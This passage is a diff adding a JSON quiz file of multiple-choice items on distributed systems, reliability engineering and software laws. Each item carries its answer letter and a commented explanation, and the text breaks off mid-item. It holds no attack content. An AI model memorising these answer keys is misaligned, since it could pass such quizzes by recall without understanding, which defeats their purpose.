@@ -1,0 +1,962 @@
+[
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "CAP Theorem",
+    "options": {
+      "a": "A distributed data store can simultaneously provide at most two out of three guarantees: Consistency (linearizability), Availability, and Partition tolerance.",
+      "b": "In a network partition, a distributed system can maintain both synchronous ACID transactions and infinite horizontal scalability.",
+      "c": "Any distributed service with high partition tolerance automatically provides continuous read availability at the expense of storage durability.",
+      "d": "Network latency can be traded for computational throughput as long as node partitions are resolved using two-phase locking."
+    },
+    "answer": "a",
+    "postanswer": "// CAP Theorem Trade-off Matrix\n// Network partitions (P) are inevitable in physical distributed networks:\n// 1. CP System (e.g. etcd, ZooKeeper, CockroachDB):\n//    - Rejects writes or times out when quorum is lost -> Guarantees Consistency\n// 2. AP System (e.g. Cassandra, DynamoDB with eventual consistency):\n//    - Accepts writes locally during partition -> Guarantees Availability, sacrifices instant Consistency"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "PACELC Theorem",
+    "options": {
+      "a": "Posits that parallel asynchronous computing eliminates latency completely when caching nodes are collocated with client endpoints.",
+      "b": "Extends CAP: if there is a Partition (P), trade Availability (A) vs Consistency (C); Else (E), trade Latency (L) vs Consistency (C).",
+      "c": "States that partitioned architectures must enforce linear consistency before event-driven microservices emit asynchronous domain events.",
+      "d": "Guarantees that asynchronous cluster topologies yield zero read latency whenever data is replicated across at least three cloud regions."
+    },
+    "answer": "b",
+    "postanswer": "// PACELC Classification Examples:\n// If Partition (P):\n//    Trade-off: [A]vailability vs [C]onsistency\n// Else (E) [Normal Operation]:\n//    Trade-off: [L]atency vs [C]onsistency\n//\n// Examples:\n// - DynamoDB / Cassandra : PA/EL (Available on partition, Low Latency normally)\n// - MongoDB / Spanner    : PC/EC (Consistent on partition, Consistent normally)"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Two-Phase Commit (2PC)",
+    "options": {
+      "a": "An optimistic lock acquisition protocol where clients submit two version hashes before committing updates to a relational database.",
+      "b": "A replication protocol that sends writes to both leader and standby replicas simultaneously before persisting to disk.",
+      "c": "An atomic commitment protocol where a coordinator polls participants in a Prepare phase, then issues a global Commit or Rollback in a Commit phase.",
+      "d": "An asynchronous batching technique that aggregates microservice transactions into dual persistent log buffers."
+    },
+    "answer": "c",
+    "postanswer": "// Two-Phase Commit (2PC) Sequence:\n// Phase 1: Prepare\nCoordinator -> Node A: PREPARE?\nCoordinator -> Node B: PREPARE?\nNode A -> Coordinator: VOTE_COMMIT (locks held)\nNode B -> Coordinator: VOTE_COMMIT (locks held)\n// Phase 2: Commit\nCoordinator -> Node A: GLOBAL_COMMIT\nCoordinator -> Node B: GLOBAL_COMMIT\n// Warning: Blocking protocol! If Coordinator dies mid-vote, participants hold locks indefinitely."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Saga Pattern",
+    "options": {
+      "a": "Replaces relational database tables with decentralized append-only event logs to ensure zero read latency across service boundaries.",
+      "b": "Guarantees immediate ACID consistency across multiple microservices by utilizing a shared distributed lock manager.",
+      "c": "A caching strategy that writes cache entries to intermediate memory before flushing dirty buffers to downstream storage.",
+      "d": "Manages distributed transactions across microservices as a sequence of local transactions, executing compensating transactions on failure."
+    },
+    "answer": "d",
+    "postanswer": "// Saga Execution Pattern (Choreography or Orchestrator):\n// Step 1: OrderService.createOrder() -> SUCCESS\n// Step 2: PaymentService.chargeCard() -> SUCCESS\n// Step 3: InventoryService.reserveStock() -> FAILED (Out of stock!)\n// Compensation Flow triggered:\n// -> PaymentService.refundPayment()\n// -> OrderService.cancelOrder()\n// Preserves eventual consistency without blocking distributed locks."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "CQRS (Command Query Responsibility Segregation)",
+    "options": {
+      "a": "Separates read and write data models, allowing reads and writes to scale, optimize, and evolve independently.",
+      "b": "Enforces that all database mutations and queries must execute synchronously through a single consolidated SQL schema.",
+      "c": "A network routing pattern where API commands bypass intermediate proxies while read queries traverse a caching reverse proxy.",
+      "d": "A concurrency model where write locks prevent read transactions from accessing materialized cache views."
+    },
+    "answer": "a",
+    "postanswer": "// CQRS Architecture:\n// Write Path (Commands):\n// Client -> POST /orders -> CommandHandler -> OrdersWriteDB (Normalized, ACID)\n//                           |\n//                     Domain Event (OrderCreated)\n//                           v\n// Read Path (Queries):\n// Projection Worker -> Updates ElasticSearch / Redis (Denormalized Read Model)\n// Client -> GET /orders/{id} -> QueryService -> Reads directly from fast Read Model"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Event Sourcing",
+    "options": {
+      "a": "Replaces microservice REST endpoints with raw pub/sub brokers to broadcast HTTP request bodies directly to client browsers.",
+      "b": "Persists the state of a business entity as an immutable, append-only sequence of state-changing domain events rather than mutating current values.",
+      "c": "A database indexing technique that pre-computes aggregate values whenever a transaction commits to the write-ahead log.",
+      "d": "An asynchronous logging framework that streams server error logs to a centralized elasticsearch observability cluster."
+    },
+    "answer": "b",
+    "postanswer": "// Event Sourcing: State as a fold/reduce over historical events\n// Instead of: UPDATE accounts SET balance = 250 WHERE id = 1;\n// Append to Event Store:\n// 1. AccountOpened { id: 1, initialDeposit: 100, at: '2026-01-01' }\n// 2. FundsDeposited { amount: 200, at: '2026-01-02' }\n// 3. FundsWithdrawn { amount: 50, at: '2026-01-03' }\n// Current State = events.reduce((balance, e) => apply(balance, e), 0); // balance = 250"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Idempotency & Idempotency Key",
+    "options": {
+      "a": "A hashing mechanism that guarantees cryptographic uniqueness for user passwords before storing them in database tables.",
+      "b": "A database constraint that prevents concurrent transactions from modifying adjacent table partitions during schema migrations.",
+      "c": "The property where an operation can be applied multiple times without changing the result beyond the initial application, often tracked via a unique request token.",
+      "d": "A network retry algorithm that exponentially reduces backoff intervals when upstream gateway connections fail."
+    },
+    "answer": "c",
+    "postanswer": "// Stripe-style Idempotency Key Pattern:\n// POST /v1/charges\n// Headers: { \"Idempotency-Key\": \"req_8f3d1b9a2c\" }\n//\n// Server Logic:\n// 1. Check Redis for key \"idemp:req_8f3d1b9a2c\"\n// 2. If exists: return cached response immediately (no re-charge!)\n// 3. If missing: atomically acquire lock, process charge, store result, return response."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Backpressure",
+    "options": {
+      "a": "The pressure exerted on network switches when TCP packet windows exceed the physical throughput of fiber cables.",
+      "b": "A database lock escalation strategy that pauses low-priority reads when write transaction buffers are exhausted.",
+      "c": "An observability alerting threshold triggered when upstream API gateway error rates exceed 5% over a 5-minute rolling window.",
+      "d": "A feedback mechanism where a downstream consumer signals an upstream producer to slow down or halt data transmission when overwhelmed."
+    },
+    "answer": "d",
+    "postanswer": "// Reactive Streams / TCP Backpressure:\n// Fast Producer (10,000 msgs/sec) ---> Slow Consumer (500 msgs/sec)\n// Without Backpressure: Consumer runs Out Of Memory (OOM) or drops packets.\n// With Backpressure (e.g. Reactive Streams, TCP Windowing, Akka):\n// Consumer: \"I have buffer capacity for 100 messages (request(100))\"\n// Producer: Sends exactly 100 messages, then waits for next demand signal."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Circuit Breaker Pattern",
+    "options": {
+      "a": "Prevents an application from repeatedly attempting an operation likely to fail, transitioning between Closed, Open, and Half-Open states to protect downstream services.",
+      "b": "An electrical safety device configured in cloud data centers to isolate rack servers drawing excess electrical current.",
+      "c": "A network routing rule that drops inbound HTTP requests if the client IP appears in an automated abuse blacklist.",
+      "d": "A concurrency primitive that terminates background worker threads when aggregate CPU utilization crosses 90%."
+    },
+    "answer": "a",
+    "postanswer": "// Circuit Breaker State Machine:\n// [CLOSED] --(Failure rate > threshold)--> [OPEN]\n//    ^                                        |\n//    |                                        | (Sleep window expires, e.g. 10s)\n//    |                                        v\n//    +---(Probe request succeeds)------- [HALF-OPEN]\n//        (Probe request fails: back to OPEN)\n// When OPEN: Fails fast immediately without calling troubled remote service."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Bulkhead Pattern",
+    "options": {
+      "a": "Replaces synchronous HTTP REST communication with asynchronous AMQP messaging queues across all core services.",
+      "b": "Isolates elements of an application into distinct pools (threads, connections, resources) so that if one fails, the others continue functioning.",
+      "c": "Encrypts inter-service network packets using ephemeral session keys to prevent lateral movement after a perimeter breach.",
+      "d": "A blue-green deployment strategy where user traffic is duplicated across two isolated container clusters simultaneously."
+    },
+    "answer": "b",
+    "postanswer": "// Bulkhead Isolation Example (Thread/Connection Pools):\n// Shared pool anti-pattern: Slow search service consumes all 100 HTTP threads -> Checkout stalls!\n// Bulkhead pattern:\n//   Pool A (Checkout Service): 50 Dedicated Connections (Guaranteed critical path)\n//   Pool B (Search / Ads):     30 Dedicated Connections (Isolated)\n//   Pool C (Reporting / Batch):20 Dedicated Connections (Isolated)\n// Search timeout never exhausts Checkout resources."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Transactional Outbox Pattern",
+    "options": {
+      "a": "Sends unread user notifications to an external dead-letter queue when SMS gateway webhooks return 500 status codes.",
+      "b": "Caches outbound HTTP responses in an edge CDN layer to avoid re-executing business logic on repeated client requests.",
+      "c": "Writes domain events to an outbox table in the same local database transaction as business entities, ensuring reliable at-least-once publishing to message brokers.",
+      "d": "Automatically rolls back distributed database transactions if downstream subscribers fail to acknowledge messages within 30 seconds."
+    },
+    "answer": "c",
+    "postanswer": "// Transactional Outbox Pattern:\n// 1. In ONE local ACID transaction:\n//    BEGIN;\n//      INSERT INTO orders (id, user_id, total) VALUES (42, 101, 99.99);\n//      INSERT INTO outbox_events (id, aggregate_type, payload) \n//        VALUES ('evt_1', 'Order', '{\"order_id\":42,\"event\":\"OrderCreated\"}');\n//    COMMIT;\n// 2. CDC process (Debezium) or poller reads outbox_events and publishes to Kafka.\n// Guarantees zero lost events without dual-write inconsistency!"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Change Data Capture (CDC)",
+    "options": {
+      "a": "Automatically compresses cold database tables into columnar Parquet files once rows exceed 90 days of age.",
+      "b": "An HTTP header negotiation protocol that caches client request bodies before submitting them to payment gateways.",
+      "c": "A schema migration tool that captures diffs between staging and production database DDL scripts.",
+      "d": "A technique that monitors and captures row-level inserts, updates, and deletes from a database's transaction log in real time."
+    },
+    "answer": "d",
+    "postanswer": "// Change Data Capture (CDC) Architecture:\n// Postgres (WAL / Logical Replication Slot)\n//    |\n//    v (Streams raw byte-level log mutations)\n// Debezium / Kafka Connect\n//    |\n//    v (Transforms to JSON / Avro events)\n// Kafka Topic: \"db.public.users\"\n//    +---> ElasticSearch Sink (Search index updated in ~10ms)\n//    +---> Snowflake / BigQuery (Near real-time analytical warehouse)"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Consistent Hashing",
+    "options": {
+      "a": "A hashing scheme where resizing the node cluster remaps on average only K/N keys, minimizing cache misses during horizontal scaling.",
+      "b": "A cryptographic hashing function that ensures deterministic password hashing across distributed CPU architectures.",
+      "c": "A database sharding algorithm that requires complete re-indexing of all table rows whenever a new shard is provisioned.",
+      "d": "A network checksum algorithm that detects packet corruption across fiber optic WAN connections."
+    },
+    "answer": "a",
+    "postanswer": "// Consistent Hash Ring Concept:\n// Traditional: node = hash(key) % N -> Changing N invalidates almost 100% of keys!\n// Consistent Hashing:\n// Keys and Nodes mapped to 0..2^32-1 ring.\n// Key belongs to first node encountered clockwise.\n// Adding node B between A and C only moves keys between A and B;\n// All other nodes' keys remain untouched. Virtual nodes prevent hot spots."
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Split-Brain Problem",
+    "options": {
+      "a": "When an individual engineer attempts to maintain two divergent feature branches concurrently without rebasing.",
+      "b": "A distributed cluster condition where network partitioning isolates sub-clusters, each mistakenly believing it is the sole active authority and accepting conflicting writes.",
+      "c": "A memory corruption bug in multi-threaded runtimes where two CPU cores overwrite the same pointer address.",
+      "d": "When an API gateway routes identical user requests to two different versions of a microservice simultaneously."
+    },
+    "answer": "b",
+    "postanswer": "// Split-Brain Scenario in 3-Node Cluster:\n// Node 1 (DC-East) <--- [NETWORK PARTITION] ---> Node 2, Node 3 (DC-West)\n// Prevention: Quorum Consensus (Q = floor(N/2) + 1)\n// Majority needed to accept writes: 3 nodes -> Quorum = 2\n// - DC-East (1 node): Lost quorum -> Rejects writes / Becomes Read-Only\n// - DC-West (2 nodes): Has quorum (2/3) -> Continues safely"
+  },
+  {
+    "category": "Distributed Systems & System Design",
+    "title": "Byzantine Fault Tolerance (BFT)",
+    "options": {
+      "a": "A fault-tolerance mechanism designed exclusively to prevent hardware memory bit-flips in cosmic-ray exposed satellites.",
+      "b": "A protocol that guarantees distributed transactions complete even when network latency reaches tens of seconds.",
+      "c": "The ability of a distributed network to reach consensus even when components fail arbitrarily or transmit conflicting/malicious information.",
+      "d": "An architectural rule requiring microservices to implement automatic fallback responses when third-party vendors fail."
+    },
+    "answer": "c",
+    "postanswer": "// Byzantine Fault Tolerance (Lamport, Shostak, Pease):\n// Nodes may be faulty, crashed, delayed, OR maliciously deceptive (traitor).\n// In standard crash-fault consensus (Raft/Paxos): Assumes nodes don't lie.\n// In BFT (e.g. PBFT, Tendermint):\n// System can tolerate up to f malicious nodes if total nodes N >= 3f + 1.\n// Example: To tolerate 1 traitor node, you need at least 4 nodes."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "SLA vs SLO vs SLI",
+    "options": {
+      "a": "SLA, SLO, and SLI are interchangeable terms describing network packet loss thresholds across API load balancers.",
+      "b": "SLA is an internal team guideline, SLO is a customer contract, and SLI is the automated deployment pipeline health check.",
+      "c": "SLI measures system revenue, SLO measures cloud infrastructure expenses, and SLA measures developer sprint velocity.",
+      "d": "SLI is the quantified metric (e.g. latency), SLO is the internal target (e.g. 99.9%), and SLA is the business contract with penalties."
+    },
+    "answer": "d",
+    "postanswer": "// Google SRE Hierarchy:\n// 1. SLI (Indicator) : Exact metric measured (e.g. % of HTTP requests < 200ms)\n// 2. SLO (Objective) : Internal engineering target (e.g. SLI >= 99.9% over 30 days)\n// 3. SLA (Agreement) : External commercial contract (e.g. If SLI < 99.0%, refund 10% credits)\n// Golden Rule: Always make your internal SLO tighter than your customer-facing SLA!"
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Error Budget",
+    "options": {
+      "a": "The permitted level of unreliability (1 - SLO) that a service can incur before feature releases are halted in favor of reliability work.",
+      "b": "The maximum financial expense allocated by leadership for third-party bug bounty vulnerability programs.",
+      "c": "A strict database transaction quota that limits how many failed queries a single tenant can submit per hour.",
+      "d": "The total number of compilation and linter errors permitted on pull requests before CI branch protection triggers."
+    },
+    "answer": "a",
+    "postanswer": "// Error Budget Mechanics (SLO: 99.9% over 30 days):\n// Total Time: 30 days * 24 hrs * 60 mins = 43,200 minutes\n// Allowed Downtime = 43,200 * (1 - 0.999) = 43.2 minutes\n//\n// SRE Policy:\n// - Budget Remaining > 0: Product teams deploy new features aggressively.\n// - Budget Depleted (0%): Deployments freeze! All sprints pivot to stability & bugs."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Four Golden Signals",
+    "options": {
+      "a": "CPU, Memory, Disk I/O, and Network Bandwidth consumption tracked across bare-metal server nodes.",
+      "b": "Latency, Traffic, Errors, and Saturation, as defined in Google's Site Reliability Engineering framework.",
+      "c": "Unit test coverage, integration pass rate, build duration, and pull request review turnaround time.",
+      "d": "Throughput, Cache Hit Ratio, Thread Pool Exhaustion, and Garbage Collection pause frequency."
+    },
+    "answer": "b",
+    "postanswer": "// Google SRE 4 Golden Signals:\n// 1. Latency   : Time taken to service a request (differentiate successful vs failed requests!)\n// 2. Traffic   : Demand placed on system (e.g. HTTP req/sec, concurrent WebSocket sessions)\n// 3. Errors    : Rate of requests that fail (HTTP 5xx, incorrect payload, exception rate)\n// 4. Saturation: How 'full' your most constrained resource is (e.g. 90% connection pool, 85% CPU memory bus)"
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "RED Method",
+    "options": {
+      "a": "A frontend performance rubric tracking Rendering speed, Execution pauses, and DOM size.",
+      "b": "A server hardware troubleshooting technique monitoring RAID disks, Ethernet cards, and Dual-in-line memory modules.",
+      "c": "A microservices monitoring philosophy focusing on Rate (requests/sec), Errors (failed requests), and Duration (latency).",
+      "d": "A cloud disaster recovery framework prioritizing Regional failover, Edge DNS routing, and Database replication."
+    },
+    "answer": "c",
+    "postanswer": "// The RED Method (Tom Wilkie / Weaveworks for Request-driven microservices):\n// - Rate     : Number of requests your service is serving per second (RPS).\n// - Errors   : Number of failed requests per second.\n// - Duration : The amount of time each request takes (usually measured in p50, p95, p99 percentiles).\n// Complementary to the USE method (which is hardware/resource focused)."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "USE Method",
+    "options": {
+      "a": "A security auditing protocol auditing User permissions, Session cookies, and Endpoint authorization headers.",
+      "b": "A database schema optimization strategy indexing Unique constraints, Surrogate keys, and Entity relationships.",
+      "c": "A software estimation heuristic evaluating User stories, Story points, and Estimated release sprints.",
+      "d": "A system performance methodology (Brendan Gregg) analyzing every resource for Utilization, Saturation, and Errors."
+    },
+    "answer": "d",
+    "postanswer": "// The USE Method (Brendan Gregg - for analyzing any computing resource):\n// For every resource (CPU, Memory, Disk, Network, Connection Pool):\n// 1. Utilization : % of time resource was busy (e.g. CPU 82% over 60s)\n// 2. Saturation  : Queue depth / backlog waiting to be serviced (e.g. Linux load avg > core count)\n// 3. Errors      : Count of error events (e.g. dropped network frames, ECC memory retries)"
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "MTTR vs MTTD vs MTBF",
+    "options": {
+      "a": "MTTD is Mean Time To Detect, MTTR is Mean Time To Recovery/Repair, and MTBF is Mean Time Between Failures.",
+      "b": "MTTR is Mean Time To Reboot, MTTD is Mean Time To Deploy, and MTBF is Mean Time Before Financial loss.",
+      "c": "MTTD measures testing duration, MTTR measures code review time, and MTBF measures branch checkout frequency.",
+      "d": "MTTR, MTTD, and MTBF are cryptographic key rotation metrics enforced in SOC2 Type II compliance audits."
+    },
+    "answer": "a",
+    "postanswer": "// Incident Lifecycle Metrics:\n// [Incident Begins] \n//      | <-- MTTD (Mean Time To Detect - via alerts/monitoring) \n// [Alert Fires] \n//      | <-- MTTR (Mean Time To Restore/Recover - via mitigation/rollback)\n// [Service Restored]\n//      | <-- MTBF (Mean Time Between Failures - reliability metric)\n// [Next Incident Begins]\n// Mature engineering organizations prioritize minimizing MTTD and MTTR over chasing impossible zero failures."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Thundering Herd Problem",
+    "options": {
+      "a": "When multiple background cron jobs execute database migrations on the primary database simultaneously.",
+      "b": "When thousands of concurrent requests all miss a cache simultaneously and slam the upstream database/backend at once.",
+      "c": "A memory allocation spike caused when Node.js runs garbage collection on multiple worker threads at once.",
+      "d": "When all distributed cluster nodes attempt to write to the same Kafka partition simultaneously."
+    },
+    "answer": "b",
+    "postanswer": "// Thundering Herd / Cache Stampede:\n// Key 'trending_products' expires in Redis.\n// 5,000 incoming requests/sec find key MISSING -> 5,000 queries hit Postgres at the same millisecond -> DB crashes!\n// Solutions:\n// 1. Mutex / Singleflight: Only 1 request queries DB; others wait on promise.\n// 2. Probabilistic Early Expiration (XFetch algorithm).\n// 3. Background cache refresher."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Cascading Failure",
+    "options": {
+      "a": "When CSS style rules conflict across child DOM elements, creating unresponsive layout reflows.",
+      "b": "An automated testing failure where one broken unit test causes subsequent integration suites to abort.",
+      "c": "A failure in one component that increases load or triggers faults in neighboring components, dominoing across the entire system.",
+      "d": "When database foreign keys cascade-delete child rows unexpectedly across relational tables."
+    },
+    "answer": "c",
+    "postanswer": "// Cascading Failure Anatomy:\n// 1. Service A node 1 crashes due to high traffic.\n// 2. Traffic redistributes to nodes 2 and 3.\n// 3. Nodes 2 and 3 get overwhelmed and crash -> Entire Service A is dead.\n// 4. Upstream Gateway threads block waiting on Service A timeouts.\n// 5. Gateway thread pool exhausts -> Entire website returns 504 Gateway Timeout!\n// Defense: Aggressive timeouts, circuit breakers, load shedding, and retries with jitter."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "OpenTelemetry: Spans, Traces, & Baggage",
+    "options": {
+      "a": "Spans and Traces are proprietary AWS CloudWatch features designed to measure serverless Lambda invocation billings.",
+      "b": "Spans represent database table indexes, Traces represent network routing hops, and Baggage measures byte size of request headers.",
+      "c": "A Trace is an error log dump, a Span is a CPU profile graph, and Baggage is the container image layer metadata.",
+      "d": "A Trace represents a complete request journey through a distributed system, composed of individual Spans, while Baggage propagates contextual key-value pairs."
+    },
+    "answer": "d",
+    "postanswer": "// OpenTelemetry Distributed Tracing Model:\n// Trace ID: 4bf92f3577b34da6a3ce929d0e0e4736\n// ├── Span 1: [Gateway] GET /checkout (250ms)\n// │   ├── Span 2: [AuthService] verifyToken (15ms)\n// │   └── Span 3: [OrderService] createOrder (220ms)\n// │       ├── Span 4: [Postgres] INSERT INTO orders (35ms)\n// │       └── Span 5: [PaymentService] chargeCard (170ms)\n// Baggage: { \"userId\": \"u123\", \"tier\": \"enterprise\" } propagated across HTTP headers."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Blameless Post-Mortem",
+    "options": {
+      "a": "An incident review process assuming people made reasonable choices with the information they had, focusing on systemic fixes rather than punishment.",
+      "b": "An incident review where legal counsel redacts all engineer identities before filing insurance claims.",
+      "c": "An automated GitHub Action that closes incident tickets if no code changes caused the production outage.",
+      "d": "A management meeting where the engineer responsible for a bug is reassigned to another engineering department."
+    },
+    "answer": "a",
+    "postanswer": "// Etsy & Google SRE Post-Mortem Principles:\n// - Core Assumption: Humans do not deliberately break production. Mistakes happen because tools, guardrails, or processes allowed it.\n// - Focus Questions:\n//   1. What systemic conditions allowed this state to occur?\n//   2. Why did our automated tests & monitoring not detect it sooner?\n//   3. How do we make this class of failure physically impossible in the future?"
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Chaos Engineering",
+    "options": {
+      "a": "Deploying untested feature branches directly to production during peak holiday traffic without code reviews.",
+      "b": "The discipline of experimenting on a system in order to build confidence in the system's capability to withstand turbulent conditions in production.",
+      "c": "A software architecture methodology that eliminates all static typing in favor of dynamic runtime metaprogramming.",
+      "d": "An agile sprint practice where engineers work on unassigned tickets without product manager oversight."
+    },
+    "answer": "b",
+    "postanswer": "// Chaos Engineering (Netflix Chaos Monkey / Gremlin):\n// Hypothesis: 'If an entire AWS Availability Zone goes dark, user checkout success rate will remain > 99.5%.'\n// Experiment:\n// 1. Measure baseline steady-state metrics.\n// 2. Inject turbulence: simulate latency, kill random Kubernetes pods, drop network packets.\n// 3. Verify hypothesis against steady-state.\n// 4. Find weaknesses before real outages find them for you."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "High Water Mark (HWM) & Low Water Mark (LWM)",
+    "options": {
+      "a": "Browser viewport scroll positions used in infinite scroll lists to load secondary DOM elements.",
+      "b": "The highest and lowest historical stock valuations used to price engineering equity grants.",
+      "c": "Threshold boundaries used in memory allocators, log replication, and cache eviction to trigger buffer flushes or mark committed offsets.",
+      "d": "Cloud security metrics tracking maximum and minimum firewall intrusion attempts per day."
+    },
+    "answer": "c",
+    "postanswer": "// High Water Mark in Distributed Logs (Kafka / Raft):\n// - Log End Offset (LEO): The latest record written by producer to leader.\n// - High Water Mark (HWM): The highest offset replicated across ALL in-sync replicas (ISR).\n// -> Consumers can ONLY read records up to the HWM to prevent dirty reads of uncommitted records that could be lost on leader election."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Load Shedding & Graceful Degradation",
+    "options": {
+      "a": "Shutting down the production database every Sunday morning to allow offline vacuuming and disk defragmentation.",
+      "b": "Compressing old relational database records into zip archives to free up block storage capacity.",
+      "c": "Offloading user password validation to third-party public DNS resolvers during traffic spikes.",
+      "d": "Deliberately rejecting non-critical or excess requests to preserve capacity and prevent complete collapse of core functionality under extreme load."
+    },
+    "answer": "d",
+    "postanswer": "// Load Shedding Strategy during 3x Traffic Surge:\n// When CPU > 85% or Queue Latency > 500ms:\n// 1. Drop tier-3 requests immediately: HTTP 429 / 503 for recommendations, analytics, comments.\n// 2. Disable heavy features: Return static product catalog without personalized recommendations.\n// 3. Keep critical path alive: 100% of resources dedicated to Checkout & Payment APIs.\n// It is far better to serve 70% of users perfectly than to crash and serve 0% of users."
+  },
+  {
+    "category": "Reliability, SRE & Observability",
+    "title": "Dead Letter Queue (DLQ)",
+    "options": {
+      "a": "A dedicated queue or storage destination where messages that cannot be processed successfully after maximum retries are isolated for analysis.",
+      "b": "A temporary buffer in email servers where unsent promotional emails are discarded after 24 hours.",
+      "c": "A database recycle bin where dropped SQL tables are stored before final disk deletion.",
+      "d": "A network router buffer that discards malformed TCP packets before they reach application sockets."
+    },
+    "answer": "a",
+    "postanswer": "// Dead Letter Queue (DLQ) Architecture:\n// Message Broker (Kafka / SQS / RabbitMQ)\n//    |\n//    v (Consume)\n// Consumer Service --[Processing Exception (e.g. malformed JSON)]--> Retry 1..3\n//    |\n//    v (Exceeded Max Retries)\n// DLQ (e.g. 'orders-dlq')\n//    |\n//    +--> Alerts SRE / Dev Team via PagerDuty\n//    +--> Prevents poison pill message from blocking remaining 10,000 valid messages in main queue!"
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Conway's Law",
+    "options": {
+      "a": "Software complexity doubles every eighteen months unless aggressive refactoring sprints are scheduled by engineering leadership.",
+      "b": "Organizations which design systems are constrained to produce designs which are copies of the communication structures of these organizations.",
+      "c": "Adding more developers to an overdue software project invariably makes the delivery date even later.",
+      "d": "Every microservice will eventually grow until it requires its own dedicated relational database cluster."
+    },
+    "answer": "b",
+    "postanswer": "// Conway's Law (Melvin Conway, 1967):\n// 'Organizations which design systems... are constrained to produce designs which are copies of the communication structures of these organizations.'\n// Inverse Conway Maneuver:\n// If you want a decoupled, modular microservice architecture, organize small, autonomous cross-functional teams around distinct business capabilities rather than siloed frontend/backend/DB teams."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Hyrum's Law",
+    "options": {
+      "a": "Any software system that can be rewritten in Rust will eventually be rewritten in Rust.",
+      "b": "The time required to fix a software defect in production is inversely proportional to the clarity of the error logs.",
+      "c": "With a sufficient number of users of an API, all observable behaviors of the system will be depended on by somebody, regardless of the contract.",
+      "d": "Network latency between microservices increases linearly with every additional serialization boundary."
+    },
+    "answer": "c",
+    "postanswer": "// Hyrum's Law (Hyrum Wright, Google):\n// 'With a sufficient number of users of an API, it does not matter what you promise in the contract: all observable behaviors of your system will be depended on by somebody.'\n// Example:\n// You sort JSON keys alphabetically internally as an implementation detail.\n// You release a patch changing the internal map order.\n// 50 clients break because they implicitly depended on sorted keys even though the spec never promised it!"
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Chesterton's Fence",
+    "options": {
+      "a": "A network firewall principle requiring all outbound traffic to traverse a centralized corporate proxy.",
+      "b": "A code review guideline stating that pull requests should touch no more than 200 lines of code.",
+      "c": "A database partitioning technique where hot tables are quarantined behind read-only replicas.",
+      "d": "Do not remove a fence, rule, or piece of legacy code until you understand the original reason why it was put there in the first place."
+    },
+    "answer": "d",
+    "postanswer": "// Chesterton's Fence (G.K. Chesterton):\n// Senior SWE scenario:\n// Junior Dev: 'Look at this bizarre sleep(500) and weird null check in the payment gateway. It looks useless, let me delete it!'\n// Senior Dev: 'Do not remove it until you discover WHY it was put there.'\n// Investigation reveals: Upstream bank has a race condition where webhooks arrive 300ms before ledger commits."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Gall's Law",
+    "options": {
+      "a": "A complex system that works is invariably found to have evolved from a simple system that worked. A complex system designed from scratch never works.",
+      "b": "Software bugs cluster together in modules that have the highest number of cyclomatic branching conditions.",
+      "c": "The amount of memory used by a program expands to fill the entire physical RAM available on the host machine.",
+      "d": "System design documents longer than five pages have an exponential probability of remaining unread by the team."
+    },
+    "answer": "a",
+    "postanswer": "// Gall's Law (John Gall):\n// 'A complex system that works is invariably found to have evolved from a simple system that worked. A complex system designed from scratch never works and cannot be patched up to make it work.'\n// Architecture takeaway:\n// Do not start a greenfield project with 40 microservices, Kubernetes, Kafka, and Istio service mesh.\n// Start with a clean, well-modularized monolith, prove the business domain, then decompose where needed."
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Brooks' Law",
+    "options": {
+      "a": "Every software architecture eventually collapses under the weight of accumulated technical debt.",
+      "b": "Adding manpower to a late software project makes it later, due to communication overhead and onboarding time.",
+      "c": "The difficulty of refactoring legacy code increases with the square of the lines of code in the repository.",
+      "d": "Developers spend 80% of their time reading code and only 20% of their time writing new code."
+    },
+    "answer": "b",
+    "postanswer": "// Brooks' Law (Fred Brooks, 'The Mythical Man-Month'):\n// 'Adding manpower to a late software project makes it later.'\n// Reasons:\n// 1. Ramp-up time: Existing senior engineers must divert time from coding to mentor new hires.\n// 2. Combinatorial communication channels: n * (n - 1) / 2 connections.\n//    - Team of 4: 6 communication paths\n//    - Team of 10: 45 communication paths!"
+  },
+  {
+    "category": "Architecture Principles & Software Laws",
+    "title": "Law of Demeter (Principle of Least Knowledge)",
+    "options": {
+      "a": "Microservices should never expose their internal database connection strings across environment variables.",
+      "b": "Engineers should only be granted read-only database credentials during active production investigations.",
+      "c": "A software component should only speak to its immediate friends and avoid reaching through objects to talk to strangers (e.g. avoid a.getB().getC().doD()).",
+      "d": "Client browsers should cache REST responses for no longer than sixty seconds to prevent stale data display."
+    },
+    "answer": "c",
